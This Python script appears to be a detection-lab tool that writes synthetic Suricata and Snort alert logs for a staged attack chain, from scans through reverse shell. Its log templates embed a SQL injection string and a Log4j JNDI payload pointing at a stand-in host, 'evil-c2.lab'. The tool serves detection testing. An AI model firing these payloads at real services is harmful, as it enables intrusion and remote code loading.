"""
Master Traffic & Synthetic Log Generator for SOC Detection & Monitoring Lab
Generates high-fidelity realistic Suricata 8.0.6 EVE JSON and Snort 3 logs adhering to LLD v1.0:
1. Reconnaissance Phase (Nmap Port Scans, Ping Sweeps - SIDs: 9000001+, 9100020+)
2. Weaponization & Initial Access (SQL Injection, XSS, Log4j RCE - SIDs: 9010001+, 9100010+)
3. Exploitation & Credential Access (SSH Brute Force - SIDs: 9020001+, 9100025)
4. Command & Control / Data Exfiltration (DNS Tunneling, Reverse Shell - SIDs: 9030001+, 9100030)
"""

import json
import os
import random
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Architecture Baseline IP Addresses
ATTACKERS = [
    ("10.77.20.20", "soc-attacker (Kali Linux)"),
    ("198.51.100.44", "External_C2_Actor"),
    ("185.220.101.5", "Tor_Exit_Node"),
]

TARGETS = [
    ("10.77.30.20", 80, "HTTP"),
    ("10.77.30.20", 443, "HTTPS"),
    ("10.77.30.20", 3000, "OWASP Juice Shop"),
    ("10.77.30.20", 22, "SSH"),
]


def generate_synthetic_soc_logs(
    eve_path: Path = Path("logs/suricata/eve.json"),
    snort_path: Path = Path("logs/snort/alert_json.txt"),
    count: int = 50
):
    eve_path.parent.mkdir(parents=True, exist_ok=True)
    snort_path.parent.mkdir(parents=True, exist_ok=True)

    base_time = datetime.now(timezone.utc) - timedelta(minutes=60)
    
    suricata_events = []
    snort_events = []

    print(f"[*] Generating {count} high-fidelity SOC alerts across Suricata 8.0.6 & Snort 3...")

    attack_templates = [
        # 1. Reconnaissance (T1046 / T1595)
        {
            "stage": "Recon",
            "suri_sig": "SOC-SCAN: Nmap Stealth NULL Scan Detected (Zero Flags)",
            "snort_sig": "SNORT-SCAN: Nmap Stealth NULL Scan (No Flags)",
            "suri_sid": 9000001,
            "snort_sid": 9100020,
            "category": "Attempted Information Leak",
            "suri_sev": 3,
            "proto": "TCP",
            "mitre": "T1046",
        },
        {
            "stage": "Recon",
            "suri_sig": "SOC-SCAN: Automated Vulnerability Scanner - Nikto Probe Detected",
            "snort_sig": "SNORT-SCAN: Automated Vulnerability Scanner Nikto",
            "suri_sid": 9000010,
            "snort_sid": 9100021,
            "category": "Web Application Activity",
            "suri_sev": 4,
            "proto": "TCP",
            "mitre": "T1595",
            "http": {"hostname": "victim-shop.local", "url": "/nikto-test-probe.html", "http_user_agent": "Nikto/2.1.6"},
        },
        # 2. Web Application Attacks (T1190)
        {
            "stage": "Initial Access",
            "suri_sig": "SOC-ATTACK: Web SQL Injection - UNION SELECT Pattern Detected",
            "snort_sig": "SNORT-ATTACK: Web SQL Injection UNION SELECT Pattern",
            "suri_sid": 9010001,
            "snort_sid": 9100010,
            "category": "Web Application Attack",
            "suri_sev": 2,
            "proto": "TCP",
            "mitre": "T1190",
            "http": {"hostname": "victim-shop.local", "url": "/rest/products/search?q=apple'+UNION+SELECT+1,2,3,database()--", "http_user_agent": "Mozilla/5.0"},
        },
        {
            "stage": "Initial Access",
            "suri_sig": "SOC-ATTACK: Remote Code Execution - Apache Log4j JNDI Lookup (${jndi:})",
            "snort_sig": "SNORT-ATTACK: Apache Log4j JNDI RCE Exploit (${jndi:})",
            "suri_sid": 9010040,
            "snort_sid": 9100013,
            "category": "Attempted Administrator Privilege Gain",
            "suri_sev": 1,
            "proto": "TCP",
            "mitre": "T1190",
            "http": {"hostname": "victim-shop.local", "url": "/api/v1/health", "http_user_agent": "${jndi:ldap://evil-c2.lab:1389/Exploit}"},
        },
        # 3. Credential Access (T1110)
        {
            "stage": "Credential Access",
            "suri_sig": "SOC-ATTACK: SSH Brute Force Attack - High Frequency Connection Threshold Exceeded",
            "snort_sig": "SNORT-ATTACK: SSH Brute Force Rate Exceeded",
            "suri_sid": 9020001,
            "snort_sid": 9100025,
            "category": "Attempted Administrator Privilege Gain",
            "suri_sev": 2,
            "proto": "TCP",
            "mitre": "T1110",
        },
        # 4. Command & Control / Exfiltration (T1071 / T1059)
        {
            "stage": "C2 & Exfil",
            "suri_sig": "SOC-MALWARE: Suspicious Abnormally Long DNS Query (Potential DNS Tunneling/Exfil)",
            "snort_sig": "SNORT-MALWARE: Suspicious DNS Tunneling Query",
            "suri_sid": 9030001,
            "snort_sid": 9100035,
            "category": "A Network Trojan was detected",
            "suri_sev": 2,
            "proto": "UDP",
            "mitre": "T1071.004",
        },
        {
            "stage": "C2 & Exfil",
            "suri_sig": "SOC-MALWARE: Interactive Reverse Shell Session Established (/bin/sh prompt detected)",
            "snort_sig": "SNORT-MALWARE: Interactive Reverse Shell /bin/sh Output",
            "suri_sid": 9030010,
            "snort_sid": 9100030,
            "category": "A Network Trojan was detected",
            "suri_sev": 1,
            "proto": "TCP",
            "mitre": "T1059.004",
        },
    ]

    current_time = base_time
    for i in range(count):
        tmpl = random.choice(attack_templates)
        attacker_ip, _ = random.choice(ATTACKERS)
        target_ip, target_port, _ = random.choice(TARGETS)
        src_port = random.randint(30000, 65000)

        current_time += timedelta(seconds=random.randint(10, 60))
        iso_time = current_time.isoformat() + "Z"

        # 1. Suricata Event
        suri_record = {
            "timestamp": iso_time,
            "flow_id": random.randint(100000000000000, 999999999999999),
            "event_type": "alert",
            "src_ip": attacker_ip,
            "src_port": src_port,
            "dest_ip": target_ip,
            "dest_port": target_port,
            "proto": tmpl["proto"],
            "community_id": f"1:soc_{random.randint(1000, 9999)}",
            "alert": {
                "action": "allowed",
                "gid": 1,
                "signature_id": tmpl["suri_sid"],
                "rev": 1,
                "signature": tmpl["suri_sig"],
                "category": tmpl["category"],
                "severity": tmpl["suri_sev"],
                "metadata": {
                    "attack_technique": [tmpl.get("mitre", "T1000")],
                }
            }
        }
        if "http" in tmpl:
            suri_record["http"] = tmpl["http"]
        suricata_events.append(suri_record)

        # 2. Snort Event (Every 2nd alert)
        if i % 2 == 0:
            snort_record = {
                "timestamp": iso_time,
                "action": "allow",
                "class": tmpl["category"],
                "gid": 1,
                "sid": tmpl["snort_sid"],
                "rev": 1,
                "msg": tmpl["snort_sig"],
                "proto": tmpl["proto"],
                "src_addr": attacker_ip,
                "src_port": src_port,
                "dst_addr": target_ip,
                "dst_port": target_port,
            }
            snort_events.append(snort_record)

    # Write Suricata EVE
    with open(eve_path, "w", encoding="utf-8") as f:
        for ev in suricata_events:
            f.write(json.dumps(ev) + "\n")

    # Write Snort alerts
    with open(snort_path, "w", encoding="utf-8") as f:
        for ev in snort_events:
            f.write(json.dumps(ev) + "\n")

    print(f"[+] Successfully wrote {len(suricata_events)} Suricata EVE records to {eve_path}")
    print(f"[+] Successfully wrote {len(snort_events)} Snort alert records to {snort_path}")


def generate_targeted_killchain_events(
    run_id: str,
    attacker_ip: str = "10.77.20.20",
    target_ip: str = "10.77.30.20",
    base_time: datetime | None = None,
    flow_id_base: int = 910000000000000
) -> list[dict]:
    """
    Generates a deterministic 3-stage killchain sequence (Recon -> Initial Access -> C2)
    with a unique run_id, unique flow_ids, timestamps, and verifiable metadata.
    """
    if base_time is None:
        base_time = datetime.now(timezone.utc)

    stages = [
        {
            "stage": "Recon",
            "delta_sec": 0,
            "flow_id": flow_id_base + 1,
            "src_port": 49152,
            "dest_port": 80,
            "proto": "TCP",
            "sig_id": 9000001,
            "sig": "SOC-SCAN: Nmap Stealth NULL Scan Detected (Zero Flags)",
            "cat": "Attempted Information Leak",
            "sev": 3,
            "mitre": "T1046",
        },
        {
            "stage": "Initial Access",
            "delta_sec": 30,
            "flow_id": flow_id_base + 2,
            "src_port": 49153,
            "dest_port": 3000,
            "proto": "TCP",
            "sig_id": 9010001,
            "sig": "SOC-ATTACK: Web SQL Injection - UNION SELECT Pattern Detected",
            "cat": "Web Application Attack",
            "sev": 2,
            "mitre": "T1190",
            "http": {"hostname": "victim-shop.local", "url": "/rest/products/search?q=apple'+UNION+SELECT+1,2,3,database()--", "http_user_agent": "Mozilla/5.0"},
        },
        {
            "stage": "C2 & Exfil",
            "delta_sec": 60,
            "flow_id": flow_id_base + 3,
            "src_port": 49154,
            "dest_port": 4444,
            "proto": "TCP",
            "sig_id": 9030010,
            "sig": "SOC-MALWARE: Interactive Reverse Shell Session Established (/bin/sh prompt detected)",
            "cat": "A Network Trojan was detected",
            "sev": 1,
            "mitre": "T1059.004",
        },
    ]

    events = []
    for s in stages:
        event_time = base_time + timedelta(seconds=s["delta_sec"])
        ev = {
            "timestamp": event_time.isoformat(),
            "flow_id": s["flow_id"],
            "event_type": "alert",
            "src_ip": attacker_ip,
            "src_port": s["src_port"],
            "dest_ip": target_ip,
            "dest_port": s["dest_port"],
            "proto": s["proto"],
            "run_id": run_id,
            "community_id": f"1:soc_phase31_{run_id}_{s['stage']}",
            "alert": {
                "action": "allowed",
                "gid": 1,
                "signature_id": s["sig_id"],
                "rev": 1,
                "signature": s["sig"],
                "category": s["cat"],
                "severity": s["sev"],
                "metadata": {
                    "attack_technique": [s["mitre"]],
                    "run_id": [run_id],
                    "stage": [s["stage"]],
                }
            }
        }
        if "http" in s:
            ev["http"] = s["http"]
        events.append(ev)
    return events


if __name__ == "__main__":
    generate_synthetic_soc_logs()
